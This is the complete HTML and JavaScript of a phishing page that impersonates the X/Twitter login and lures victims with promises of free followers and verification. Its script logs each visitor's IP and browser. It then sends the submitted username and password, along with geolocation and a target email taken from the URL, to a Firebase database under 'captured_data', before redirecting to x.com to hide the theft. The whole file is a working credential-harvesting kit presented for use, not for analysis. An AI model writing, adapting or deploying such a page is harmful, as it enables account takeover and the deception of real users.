<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>X / Twitter - Login</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="../firebase-config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
        }
        .container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
        }
        
        .login-box {
            background: #000;
            border: 1px solid #333;
            border-radius: 16px;
            padding: 40px 30px;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header .logo {
            font-size: 3em;
            margin-bottom: 15px;
        }
        .header h1 {
            font-size: 2em;
            font-weight: 700;
        }
        
        .offer-banner {
            background: rgba(29,161,242,0.1);
            border: 1px solid #1da1f2;
            color: #1da1f2;
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 25px;
            font-size: 0.9em;
        }
        .offer-banner strong { color: #fff; font-size: 1.1em; }
        
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            color: #888;
            margin-bottom: 8px;
            font-size: 0.85em;
        }
        .form-group input {
            width: 100%;
            padding: 16px 18px;
            border: 2px solid #333;
            border-radius: 8px;
            font-size: 1em;
            transition: all 0.3s;
            background: transparent;
            color: #fff;
        }
        .form-group input:focus {
            border-color: #1da1f2;
            outline: none;
            box-shadow: 0 0 0 2px rgba(29,161,242,0.2);
        }
        .form-group input::placeholder { color: #555; }
        
        .login-btn {
            width: 100%;
            padding: 16px;
            background: #1da1f2;
            border: none;
            border-radius: 30px;
            color: #000;
            font-size: 1.05em;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        .login-btn:hover { background: #1a91da; }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #333;
        }
        .divider span {
            padding: 0 15px;
            color: #555;
            font-size: 0.85em;
        }
        
        .google-btn {
            width: 100%;
            padding: 14px;
            background: transparent;
            border: 1px solid #333;
            border-radius: 30px;
            color: #fff;
            font-size: 0.95em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 10px;
        }
        .google-btn:hover { background: rgba(255,255,255,0.05); }
        
        .apple-btn {
            width: 100%;
            padding: 14px;
            background: #fff;
            border: none;
            border-radius: 30px;
            color: #000;
            font-size: 0.95em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .apple-btn:hover { background: #e6e6e6; }
        
        .forgot {
            text-align: center;
            margin-top: 20px;
        }
        .forgot a { color: #1da1f2; text-decoration: none; font-size: 0.85em; }
        .forgot a:hover { text-decoration: underline; }
        
        .signup-text {
            text-align: center;
            margin-top: 25px;
            color: #555;
            font-size: 0.9em;
        }
        .signup-text a { color: #1da1f2; text-decoration: none; }
        .signup-text a:hover { text-decoration: underline; }
        
        .loading {
            display: none;
            text-align: center;
            padding: 25px;
        }
        .loading .spinner {
            border: 3px solid #333;
            border-top: 3px solid #1da1f2;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading p { color: #555; margin-top: 10px; }
        
        .success-msg {
            display: none;
            text-align: center;
            padding: 25px;
            background: rgba(29,161,242,0.1);
            border: 1px solid #1da1f2;
            border-radius: 12px;
        }
        .success-msg h3 { color: #1da1f2; }
        .success-msg p { color: #ccc; margin-top: 10px; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="header">
                <div class="logo">𝕏</div>
                <h1>X / Twitter</h1>
            </div>
            
            <div class="offer-banner">
                <strong>🎉 Exclusive Offer!</strong><br>
                ✅ Free 10K Followers · ✅ Blue Tick Verification<br>
                ✅ Free 50K Likes · ✅ Monetization Enable
            </div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label>Phone, email, or username</label>
                    <input type="text" id="username" placeholder="Enter your phone, email or username" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" id="password" placeholder="Enter your password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Verifying your account...</p>
            </div>
            
            <div class="success-msg" id="successMsg">
                <h3>✅ Success!</h3>
                <p>Your free followers and Blue Tick request has been submitted!</p>
                <p style="margin-top:10px;font-size:0.8em;color:#555;">Redirecting to X...</p>
            </div>
            
            <div class="divider"><span>or</span></div>
            
            <button class="google-btn">🔵 Sign in with Google</button>
            <button class="apple-btn">⚫ Sign in with Apple</button>
            
            <div class="forgot">
                <a href="#">Forgot password?</a>
            </div>
            
            <div class="signup-text">
                Don't have an account? <a href="#">Sign up</a>
            </div>
        </div>
    </div>
    
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const linkID = urlParams.get('id') || 'direct_' + Date.now();
        const targetEmail = urlParams.get('target') || '';
        
        let visitorIP = '';
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                visitorIP = data.ip;
                db.ref('visits/' + linkID).push({
                    ip: visitorIP,
                    userAgent: navigator.userAgent,
                    timestamp: Date.now(),
                    page: 'twitter',
                    target: targetEmail
                });
            });
        
        if (targetEmail) document.getElementById('username').value = decodeURIComponent(targetEmail);
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            let location = 'Unknown';
            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(data => { location = data.city + ', ' + data.country_name; })
                .catch(() => {})
                .finally(() => {
                    db.ref('captured_data/' + linkID).set({
                        username, password, ip: visitorIP, location,
                        userAgent: navigator.userAgent, timestamp: Date.now(),
                        service: 'twitter', target: targetEmail
                    });
                    db.ref('all_captures').push({
                        username, password, ip: visitorIP, location,
                        service: 'twitter', target: targetEmail, timestamp: Date.now()
                    });
                    
                    setTimeout(() => {
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('successMsg').style.display = 'block';
                        setTimeout(() => window.location.href = 'https://x.com', 3000);
                    }, 2000);
                });
        });
    </script>
</body>
</html>
